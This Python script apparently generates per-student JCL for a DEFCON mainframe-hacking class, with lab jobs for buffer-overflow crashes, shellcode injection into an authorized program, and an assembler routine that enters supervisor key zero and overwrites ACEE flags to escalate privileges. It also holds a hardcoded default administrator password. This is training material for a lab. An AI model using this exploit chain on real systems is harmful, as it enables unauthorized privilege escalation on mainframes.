#!/usr/bin/env python3
# This script was built for the DEFCON Class
# Use the JCL below to provision staging dataset
# Then upload LGBT400, LOC400, WTO400 to IT.
# The JCL generated expects to use rdrprep to generate EBCDIC
# Once you've compiled and prelinked hello.c run this script
# convert the output jcl to ebcdic jcl with rdrprep and submit
# then one at a time to the EBCDIC reader on port 3506:
# for i in *.jcl; do echo $i;rdrprep $i;cat reader.jcl|ncat --send-only -w1 172.17.0.3 3506; read; done

## JCL to build staging PDS for overflows.
# //CREATEOF EXEC PGM=IEFBR14
# //OVERFLOW DD  DSN=DEFCON.OVERFLOW,DISP=(NEW,CATLG),
# //             UNIT=SYSDA,VOL=SER=PUB000,
# //             SPACE=(TRK,(3,3,3),RLSE),
# //             DCB=(DSORG=PS,RECFM=FB,LRECL=400,BLKSIZE=400)
# //ARBAUTH  DD  DSN=DEFCON.OVERFLOW.ARBAUTH,DISP=(NEW,CATLG),
# //             UNIT=SYSDA,VOL=SER=PUB000,
# //             SPACE=(TRK,(3,3,3),RLSE),
# //             DCB=(DSORG=PS,RECFM=FB,LRECL=30000,BLKSIZE=30000)
# //SOURCE   DD  DSN=DEFCON.SOURCE,DISP=(NEW,CATLG),
# //             UNIT=SYSDA,VOL=SER=PUB000,
# //             SPACE=(TRK,(3,3,3),RLSE),DCB=SYS1.MACLIB
# //EXEC     DD  DSN=DEFCON.EXEC,DISP=(NEW,CATLG),
# //             UNIT=SYSDA,VOL=SER=PUB000,
# //             SPACE=(TRK,(3,3,3),RLSE),DCB=SYS2.EXEC


from pathlib import Path


# This job does all the magic
USERJOB = ('''//{usern} JOB (1),'ADD {usern}',CLASS=S,MSGLEVEL=(1,1),
//             MSGCLASS=A,USER=IBMUSER,PASSWORD=SYS1,NOTIFY=IBMUSER
// EXEC TSONUSER,ID={usern},
//      PW='{usern}',
//      PR='IKJACCNT',
//      OP='NOOPER',
//      AC='NOACCT',
//      JC='JCL',
//      MT='NOMOUNT'
//STEP01   EXEC PGM=IEFBR14   
//OVERFLOW DD  DSN={usern}.OVERFLOW,DISP=(NEW,CATLG),    
//             UNIT=SYSDA,VOL=SER=PUB000,                          
//             SPACE=(TRK,(3,3,3),RLSE),                              
//             DCB=DEFCON.OVERFLOW     
//OVERFLOW DD  DSN={usern}.OVERFLOW.ARBAUTH,DISP=(NEW,CATLG),    
//             UNIT=SYSDA,VOL=SER=PUB000,                          
//             SPACE=(TRK,(3,3,3),RLSE),                              
//             DCB=DEFCON.OVERFLOW.ARBAUTH      
//DUMP001  DD  DSN={usern}.DUMP001,DISP=(NEW,CATLG),    
//             UNIT=SYSDA,VOL=SER=PUB000,                          
//             SPACE=(TRK,(10,5),RLSE),                              
//             DCB=(DSORG=PS,RECFM=FB,LRECL=121,BLKSIZE=400)       
//DUMP002  DD  DSN={usern}.DUMP002,DISP=(NEW,CATLG),    
//             UNIT=SYSDA,VOL=SER=PUB000,                          
//             SPACE=(TRK,(10,5),RLSE),                              
//             DCB=(DSORG=PS,RECFM=FB,LRECL=121,BLKSIZE=400)        
//DUMP003  DD  DSN={usern}.DUMP003,DISP=(NEW,CATLG),    
//             UNIT=SYSDA,VOL=SER=PUB000,                          
//             SPACE=(TRK,(10,5),RLSE),                              
//             DCB=(DSORG=PS,RECFM=FB,LRECL=121,BLKSIZE=400)        
//DUMP004  DD  DSN={usern}.DUMP004,DISP=(NEW,CATLG),    
//             UNIT=SYSDA,VOL=SER=PUB000,                          
//             SPACE=(TRK,(10,5),RLSE),                              
//             DCB=(DSORG=PS,RECFM=FB,LRECL=121,BLKSIZE=400)
//JCLLIB   DD  DSN={usern}.JCLLIB,DISP=(NEW,CATLG),
//             UNIT=SYSDA,VOL=SER=PUB000,
//             SPACE=(CYL,(1,1,20)),DCB=SYS1.MACLIB 
//EXEC     DD  DSN={usern}.EXEC,DISP=(NEW,CATLG),
//             UNIT=SYSDA,VOL=SER=PUB000,
//             SPACE=(CYL,(1,1,20)),DCB=SYS1.MACLIB 
//* COPY ALL MEMBERS FROM ONE PDS TO ANOTHER
//COPYTHEM EXEC PGM=IEBCOPY
//SYSPRINT DD SYSOUT=*
//* SYSUT1 is source SYSUT2 is destination
//SYSUT1 DD DSN=DEFCON.OVERFLOW,DISP=SHR
//SYSUT2 DD DSN={usern}.OVERFLOW,DISP=SHR
//SYSIN DD DUMMY
//* 
//* COPY ALL MEMBERS FROM ONE PDS TO ANOTHER
//*
//COPYOVRF EXEC PGM=IEBCOPY
//SYSPRINT DD SYSOUT=*
//* SYSUT1 is source SYSUT2 is destination
//SYSUT1 DD DSN=DEFCON.OVERFLOW,DISP=SHR
//SYSUT2 DD DSN={usern}.OVERFLOW,DISP=SHR
//SYSIN DD DUMMY
//*
//* 
//* COPY ALL MEMBERS FROM ONE PDS TO ANOTHER
//*
//COPYOVRF EXEC PGM=IEBCOPY
//SYSPRINT DD SYSOUT=*
//* SYSUT1 is source SYSUT2 is destination
//SYSUT1 DD DSN=DEFCON.OVERFLOW.ARBAUTH,DISP=SHR
//SYSUT2 DD DSN={usern}.OVERFLOW.ARBAUTH,DISP=SHR
//SYSIN DD DUMMY
//*
//COPYSRC  EXEC PGM=IEBCOPY
//SYSPRINT DD SYSOUT=*
//* SYSUT1 is source SYSUT2 is destination
//SYSUT1 DD DSN=DEFCON.SOURCE,DISP=SHR
//SYSUT2 DD DSN={usern}.SOURCE,DISP=SHR
//SYSIN DD DUMMY
//* 
//COPYEXEC EXEC PGM=IEBCOPY
//SYSPRINT DD SYSOUT=*
//* SYSUT1 is source SYSUT2 is destination
//SYSUT1 DD DSN=DEFCON.EXEC,DISP=SHR
//SYSUT2 DD DSN={usern}.EXEC,DISP=SHR
//SYSIN DD DUMMY
//* 
//LINK    EXEC PGM=IEWL,PARM='MAP,LIST,XREF,NORENT',REGION=1024K
//SYSPRINT  DD SYSOUT=A
//SYSLMOD   DD DISP=SHR,DSN={usern}.LOAD(HELLO)
//SYSUT1    DD UNIT=SYSDA,SPACE=(CYL,(5,1))
//SYSLIN    DD DATA,DLM=$$
::E GETSPLOIT/hello.load
$$
//*
//STORE   EXEC PGM=IEBUPDTE,REGION=1024K,PARM=NEW
//SYSPRINT  DD SYSOUT=*
//SYSUT2    DD DSN={usern}.JCLLIB,DISP=SHR
//SYSIN     DD DATA,DLM=$$
./ ADD NAME=LAB01,LIST=ALL
//{usern}LAB1 JOB (TSO),
//             'Normal Run',
//             CLASS=A,
//             MSGCLASS=H,
//             MSGLEVEL=(1,1),NOTIFY=&SYSUID
//RUN    EXEC PGM=HELLO,REGION=0M
//SYSPRINT  DD SYSOUT=*
//STDOUT    DD SYSOUT=*
//STDIN     DD *
TESTRUN
//*
//STEPLIB   DD DISP=SHR,DSN={usern}.LOAD
./ ADD NAME=LAB02,LIST=ALL
//{usern}LAB2 JOB (TSO),
//             'Crash Run',
//             CLASS=A,
//             MSGCLASS=H,
//             MSGLEVEL=(1,1),NOTIFY=&SYSUID
//RUN    EXEC PGM=HELLO,REGION=0M
//SYSPRINT  DD SYSOUT=*
//STDOUT    DD SYSOUT=A
//STDIN     DD DISP=SHR,DSN={usern}.OVERFLOW(LGBT400)
//STEPLIB   DD DISP=SHR,DSN={usern}.LOAD
//SYSUDUMP  DD DISP=SHR,DSN={usern}.DUMP001
./ ADD NAME=LAB03,LIST=ALL
//{usern}LAB3 JOB (TSO),
//             'LOCATE Run',
//             CLASS=A,
//             MSGCLASS=H,
//             MSGLEVEL=(1,1),NOTIFY=&SYSUID
//RUN    EXEC PGM=HELLO,REGION=0M
//SYSPRINT  DD SYSOUT=*
//STDOUT    DD SYSOUT=A
//STDIN     DD DISP=SHR,DSN={usern}.OVERFLOW(LOC400)
//STEPLIB   DD DISP=SHR,DSN={usern}.LOAD
//SYSUDUMP  DD DISP=SHR,DSN={usern}.DUMP002
./ ADD NAME=LAB04,LIST=ALL
//{usern}LAB4  JOB (TSO),'EXPLOIT Run',CLASS=A,MSGCLASS=H,
//             MSGLEVEL=(1,1),NOTIFY=&SYSUID
//RUN    EXEC PGM=HELLO,REGION=0M
//SYSPRINT  DD SYSOUT=*
//STDOUT    DD SYSOUT=*
//STDIN     DD DISP=SHR,DSN={usern}.OVERFLOW(WTO400)
//STEPLIB   DD DISP=SHR,DSN={usern}.LOAD
//SYSUDUMP  DD SYSOUT=*
./ ADD NAME=LAB05,LIST=ALL
//{usern}LAB5  JOB (TSO),                   
//             'RUN OPENTEST',            
//             CLASS=A,                   
//             MSGCLASS=H,                
//             MSGLEVEL=(2,1),            
//             REGION=0K,                 
//             NOTIFY=&SYSUID             
//OPENTST   EXEC PGM=OPENTST              
//SYSPRINT DD   SYSOUT=A                  
//STEPLIB  DD   DISP=SHR,DSN=SYSC.LINKLIB 
//SYSUDUMP DD   DISP=SHR,DSN={usern}.DUMP003                  
//INPUTDD  DD   *                         
<CHANGE TO YOUR USERNAME>                                      
//*
./ ADD NAME=LAB06,LIST=ALL
//{usern}LAB6 JOB (TSO),                                         
//             'DEBRUJIN PATTERN',
//             CLASS=A,                                         
//             MSGCLASS=H,                                      
//             MSGLEVEL=(2,1),                                  
//             REGION=0K,                                       
//             NOTIFY=&SYSUID                                   
//OPENTST   EXEC PGM=IKJEFT01                                   
//SYSTSPRT    DD   SYSOUT=*                                     
//STDOUT      DD   DISP=SHR,DSN={usern}.OVERFLOW.ARBAUTH(DEBRUJIN) 
//SYSTSIN     DD    *                                           
 RX '{usern}.EXEC(DEBRUJIN)' '1000'                                  
//*    
./ ADD NAME=LAB07,LIST=ALL
//{usern}LAB7   JOB (TSO),                   
//             'HACK OPENTEST',            
//             CLASS=A,                   
//             MSGCLASS=H,                
//             MSGLEVEL=(2,1),            
//             REGION=0K,                 
//             NOTIFY=&SYSUID             
//OPENTST   EXEC PGM=OPENTST              
//SYSPRINT DD   SYSOUT=*                  
//STEPLIB  DD   DISP=SHR,DSN=SYSC.LINKLIB 
//SYSUDUMP DD   DD DISP=SHR,DSN={usern}.DUMP003                  
//INPUTDD  DD   DISP=SHR,DSN={usern}.OVERFLOW.ARBAUTH(DEBRUJIN)
./ ADD NAME=LAB08,LIST=ALL
//{usern}LAB8   JOB (TSO),                                     
//             'COMP WTOPOC',                              
//             CLASS=A,                                    
//             MSGCLASS=H,                                 
//             MSGLEVEL=(2,1),                             
//             REGION=0K,,                 
//             NOTIFY=&SYSUID                                     
//ASMLKD1 EXEC ASMFCL,                                     
//             PARM.ASM='OBJECT,NODECK,TERM,XREF(SHORT)',  
//             PARM.LKED='LET,MAP,XREF,LIST,TEST'          
//ASM.SYSLIB  DD   DSN=SYS1.MACLIB,DISP=SHR                
//            DD   DSN=SYS2.MACLIB,DISP=SHR                
//            DD   DSN=SYS1.AMODGEN,DISP=SHR               
//            DD   DSN=SYS1.AMACLIB,DISP=SHR               
//ASM.SYSTERM DD SYSOUT=*                                  
//ASM.SYSTERM DD SYSOUT=*                                  
//ASM.SYSIN   DD *,DLM=@@                                  
WTOPOC   CSECT                                             
*                                                          
* PREFIX TO SIMULATE R14 RETURN                            
*                                                          
         LR    R14,R15                                     
         LA    R14,16(R14)                                 
         BC    15,0(,R14)                                  
         NOPR  0                                           
EYE4     DC    XL4'CAFEBABE'                               
         USING *,R12                                       
*                                                          
* WTO AND THEN EXIT                                        
*                                                          
COPY     LR    R12,R14                                     
         LA    R1,MSGWTO                                   
         SVC   35                                          
         SVC   03                                          
MSGWTO   DC    XL4'00100000'                               
         DC    C'WTO HAS RUN!'                             
EYE1     DC    XL4'CAFEBABE'                               
         YREGS                                             
         END   WTOPOC CSECT                                
@@                                                         
//LKED.SYSLMOD  DD DSN={usern}.LOAD(WTOPOC),DISP=SHR  
//LKED.SYSPRINT DD   SYSOUT=* 
./ ADD NAME=LAB09,LIST=ALL
//{usern}LAB9   JOB (TSO),                   
//             'RUN ARBAUTH',            
//             CLASS=A,                   
//             MSGCLASS=H,                
//             MSGLEVEL=(2,1),            
//             REGION=0K,                 
//             NOTIFY=&SYSUID 
//ARBAUTH   EXEC PGM=ARBAUTH,            
// PARM='IEFBR14 '                       
//SYSPRINT DD   SYSOUT=*                 
//STEPLIB  DD   DISP=SHR,DSN=SYS2.LINKLIB
//         DD   DISP=SHR,DSN=SYSC.LINKLIB 
//SYSUDUMP DD   SYSOUT=*      
./ ADD NAME=LAB10,LIST=ALL
//{usern}LB10   JOB (TSO),                   
//             'Exploit ARBAUTH',            
//             CLASS=A,                   
//             MSGCLASS=H,                
//             MSGLEVEL=(2,1),            
//             REGION=0K,                 
//             NOTIFY=&SYSUID 
//ARBAUTH   EXEC PGM=ARBAUTH,            
// PARM='OPENTST '                       
//SYSPRINT DD   SYSOUT=A                 
//STEPLIB  DD   DISP=SHR,DSN=SYS2.LINKLIB
//         DD   DISP=SHR,DSN=SYSC.LINKLIB
//SYSUDUMP DD   DD DISP=SHR,DSN={usern}.DUMP004    
//INPUTDD  DD   DISP=SHR,DSN={usern}.OVERFLOW.ARBAUTH(SHELCODE)   
./ ADD NAME=LAB11,LIST=ALL
//{usern}LB11   JOB (TSO),                                     
//             'COMP ACEEJOB',                              
//             CLASS=A,                                    
//             MSGCLASS=H,                                 
//             MSGLEVEL=(2,1),                             
//             REGION=0K                                   
//ASMLKD1 EXEC ASMFCL,                                     
//             PARM.ASM='OBJECT,NODECK,TERM,XREF(SHORT)',  
//             PARM.LKED='LET,MAP,XREF,LIST,TEST'          
//ASM.SYSLIB  DD   DSN=SYS1.MACLIB,DISP=SHR                
//            DD   DSN=SYS2.MACLIB,DISP=SHR                
//            DD   DSN=SYS1.AMODGEN,DISP=SHR               
//            DD   DSN=SYS1.AMACLIB,DISP=SHR               
//ASM.SYSTERM DD SYSOUT=*                                  
//ASM.SYSTERM DD SYSOUT=*                                  
//ASM.SYSIN   DD DATA,DLM=@@                                  
ACEEJOB  CSECT                                             
*
* PREFIX TO SIMULATE R14 RETURN
*
         LR    R14,R15
         LA    R14,16(R14)
         BC    15,0(,R14)
         NOPR  0
EYE4     DC    XL4'CAFEBABE'
         USING *,R12
*
* ENTER KEY ZERO
*   
COPY     LR    R12,R14
         LA    R1,60
* MODESET KEY=ZERO,MODE=SUP
         SVC   107
*
* LOAD ACEE
*       
         L R5,X'224'           POINTER TO ASCB
         L R5,X'6C'(R5)         POINTER TO ASXB
         L R5,X'C8'(R5)         POINTER TO ACEE   
*
* WRITE ACEE
*       
         NI X'26'(R5),X'00'
         OI X'26'(R5),X'B1' 
*
* EXIT
*      
         LA    R1,MSGCOMPL   
         SVC   35                 
         SVC   03
MSGCOMPL DC XL4'00140000'
         DC C'WRITING COMPLETE'
EYE1     DC    XL4'CAFEBABE'
         YREGS
         END    
@@               
//LKED.SYSLMOD  DD DSN={usern}.LOAD(ACEEJOB),DISP=SHR  
//LKED.SYSPRINT DD   SYSOUT=*   
./ ADD NAME=LAB12,LIST=ALL
//{usern}LB12   JOB (TSO),                                          
//             'PRIVESC',                                   
//             CLASS=A,                                         
//             MSGCLASS=H,                                      
//             MSGLEVEL=(2,1),                                  
//             REGION=0K,                                       
//             NOTIFY=&SYSUID                                   
//ARBAUTH   EXEC PGM=ARBAUTH,                                   
// PARM='OPENTST '                                              
//SYSPRINT DD   SYSOUT=*                                        
//STEPLIB  DD   DISP=SHR,DSN=SYS2.LINKLIB                       
//         DD   DISP=SHR,DSN=SYSC.LINKLIB                       
//SYSUDUMP DD   DD DISP=SHR,DSN={usern}.DUMP004                                        
//INPUTDD  DD   DISP=SHR,DSN={usern}.OVERFLOW.ARBAUTH(SHELCODE)    
//STEP01 EXEC PGM=IEBGENER,COND=EVEN                            
//SYSPRINT DD SYSOUT=*                                          
//SYSIN    DD DUMMY                                             
//SYSUT1   DD DSN=WHITE.RABBIT(SCRIPT),DISP=SHR              
//SYSUT2   DD SYSOUT=*                                          
//SYSTSPRT DD SYSOUT=*                      
./ ADD NAME=BONUS01,LIST=ALL
//BONUS01  JOB (TSO),
//             'RUN FIXDSCB',
//             CLASS=A,
//             MSGCLASS=H,
//             MSGLEVEL=(1,1),
//             REGION=0K
//FIXDSCB    EXEC PGM=FIXDSCB
//SYSPRINT DD   SYSOUT=A
//STEPLIB  DD   DISP=SHR,DSN=SYSC.LINKLIB
//SYSIN    DD   *
EXTEND  VOLUME=MVSRES,DSNAME=SYS1.LINKLIB
//*
$$
''')

for x in range(0,23):
    with open("users/DC{}.jcl".format(str(x).zfill(2)), 'w') as jclfile:
        print("*** Writting users/DC{}.jcl".format(str(x).zfill(2)))
        jclfile.write(USERJOB.format(usern="DC{}".format(str(x).zfill(2))))

